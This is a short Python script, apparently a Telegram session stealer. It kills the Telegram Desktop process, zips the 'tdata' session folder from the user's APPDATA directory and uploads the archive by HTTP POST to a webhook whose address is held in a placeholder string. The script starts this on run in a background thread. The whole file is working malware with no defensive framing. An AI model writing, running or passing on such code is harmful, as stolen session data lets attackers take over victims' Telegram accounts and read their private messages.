import os
import zipfile
import threading
import requests
import subprocess

def zip(path, pathzip):
  with zipfile.ZipFile(pathzip, 'w', zipfile.ZIP_DEFLATED) as zipf:
    for root, dirs, files in os.walk(path):
      dirs[:] = [d for d in dirs if d not in ['user_data', 'emoji']]
      for file in files:
        zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), path))

def kprocess(process):
    try:
        subprocess.call(['taskkill', '/F', '/IM', process])
    except Exception as e:
        print(f"e {process}: {e}")

def ziptlg(path, exenom, process):
    if os.path.exists(path):
        kprocess(exenom)
        zippath = "rez.zip"
        zip(path, zippath)
        print('ok extract')
        zipwebhook(zippath)
        print('ok webh')

def zipwebhook(zip_path):
    webh = "tonwebh"
    files = {'file': (os.path.basename(zip_path), open(zip_path, 'rb'))}
    response = requests.post(webh, files=files)
    print(response.text) 

roaming = os.getenv('APPDATA')
pathtlg = os.path.join(roaming, "Telegram Desktop", "tdata")
process = "Telegram.exe"

thread = threading.Thread(target=ziptlg, args=(pathtlg, process, "Telegram"))
thread.start()
